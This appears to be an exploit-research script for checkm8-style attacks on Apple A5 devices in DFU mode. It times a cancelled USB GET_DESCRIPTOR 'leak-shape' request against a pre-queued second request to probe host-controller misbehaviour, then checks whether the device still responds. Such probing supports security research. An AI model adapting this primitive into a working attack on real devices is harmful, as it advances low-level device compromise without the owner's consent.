#!/usr/bin/env python3
"""The chain cut: victim + PRE-QUEUED continuation, cancel mid-band.

Shape: submit an IN leak-shape victim (GET_DESCRIPTOR string3 HABR
wLength 0x80), immediately submit an identical second request (it
parks behind the victim on the EP0 ring), then cancel the victim at
~1.05ms (the trap zone where the setup has landed but the data phase
never fully runs). The xHC's stop/reap then either restarts into the
pre-queued continuation (continuation semantics -> abnormal
actual/elapsed for request 2) or wedges until port reset.

Discriminators printed: victim and continuation status/actual/elapsed,
plus post-chain serve health per phase.
"""
import ctypes
import fcntl
import glob
import os
import struct
import sys
import time

import importlib.util

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
d = importlib.util.module_from_spec(spec)
spec.loader.exec_module(d)

LIBUSB_TRANSFER_TYPE_CONTROL = 0
LIBUSB_TRANSFER_FREE_BUFFER = 1 << 1


def build(usb, handle, bmRequestType, bRequest, wValue, wIndex, wLength,
          data=b''):
    """Mirror raw_ctrl's transfer construction without submitting."""
    L = usb.lib
    if (bmRequestType & 0x80) and len(data) < wLength:
        data = data + b'\0' * (wLength - len(data))
    packet = struct.pack('<BBHHH', bmRequestType, bRequest, wValue,
                         wIndex, wLength) + bytes(data)
    buf = usb._malloc(len(packet))
    ctypes.memmove(buf, packet, len(packet))
    transfer = L.libusb_alloc_transfer(0)
    if not transfer:
        raise SystemExit('alloc failed')
    t = transfer.contents
    t.dev_handle = handle
    t.flags = LIBUSB_TRANSFER_FREE_BUFFER
    t.endpoint = 0
    t.type = LIBUSB_TRANSFER_TYPE_CONTROL
    t.timeout = 0
    t.status = -1
    t.length = len(packet)
    t.actual_length = 0
    t.callback = None
    t.user_data = None
    t.buffer = buf
    t.num_iso_packets = 0
    return transfer, packet


def wait(usb, transfer, timeout_s):
    return usb._wait_transfer(transfer, int(timeout_s * 1000))


def serve_probe(timeout=400):
    class Ctl(ctypes.Structure):
        _fields_ = [('r', ctypes.c_ubyte), ('b', ctypes.c_ubyte),
                    ('w', ctypes.c_ushort), ('i', ctypes.c_ushort),
                    ('l', ctypes.c_ushort), ('t', ctypes.c_uint),
                    ('d', ctypes.c_void_p)]
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() != "1227":
                continue
        except OSError:
            continue
        n = os.path.dirname(p)
        bus = int(open(n + "/busnum").read())
        dev = int(open(n + "/devnum").read())
        fd = os.open("/dev/bus/usb/%03d/%03d" % (bus, dev), os.O_RDWR)
        buf = ctypes.create_string_buffer(255)
        ct = Ctl(0x80, 6, 0x0303, 0x0409, 255, timeout,
                 ctypes.cast(buf, ctypes.c_void_p))
        t0 = time.time()
        try:
            r = fcntl.ioctl(fd, 0xC0185500, ct)
            return "ret=%d %.1fms cpid=%s" % (
                r, (time.time() - t0) * 1000,
                "CPID" in buf.raw[:r].decode("utf-16le", "ignore"))
        except OSError as e:
            return "errno=%d %.1fms" % (e.errno, (time.time() - t0) * 1000)
        finally:
            os.close(fd)
    return "GONE"


def main():
    usb = d.LibUSB()
    dev, handle, desc, _ = d.acquire(usb, want_serial=False)
    print("acquired; serving live? %s" % serve_probe())

    # 1) victim: IN leak-shape
    v_tr, _ = build(usb, handle, 0x80, 6, (3 << 8) | 3, 0x040A, 0x80)
    # 2) continuation: the identical IN shape, parks behind the victim
    c_tr, _ = build(usb, handle, 0x80, 6, (3 << 8) | 3, 0x040A, 0x80)

    L = usb.lib
    t0 = time.perf_counter()
    rc1 = L.libusb_submit_transfer(v_tr)
    rc2 = L.libusb_submit_transfer(c_tr)
    print("submit victim rc=%d continuation rc=%d (%.0fus apart)"
          % (rc1, rc2, (time.perf_counter() - t0) * 1e6))

    # cancel the victim at ~1.05ms (the trap zone)
    deadline = t0 + 0.00105
    cancel_rc = -5
    vt = v_tr.contents
    while time.perf_counter() < deadline:
        if vt.status != -1:
            cancel_rc = -6  # completed before deadline
            break
    else:
        cancel_rc = L.libusb_cancel_transfer(v_tr)
    victim_cancel_us = (time.perf_counter() - t0) * 1e6

    # wait both out
    sv, av = wait(usb, v_tr, 3.0)
    print("victim: status=%s actual=%d cancel_rc=%d at %.0fus"
          % (d.STATUS_NAMES.get(sv, sv), av, cancel_rc, victim_cancel_us))
    sc, ac = wait(usb, c_tr, 3.0)
    ct_us = (time.perf_counter() - t0) * 1e6
    print("continuation: status=%s actual=%d total=%.0fus %s"
          % (d.STATUS_NAMES.get(sc, sc), ac, ct_us,
             "<<< CONTINUATION ANOMALY" if sc == 0 and ac != 128 else ""))
    L.libusb_free_transfer(v_tr)
    L.libusb_free_transfer(c_tr)

    # post-chain health at increasing delays
    for delay in [0.2, 0.7, 2.0]:
        time.sleep(delay)
        print("  post+%0.1fs: %s" % (delay, serve_probe()))
    print("CHAIN DONE")


if __name__ == "__main__":
    main()
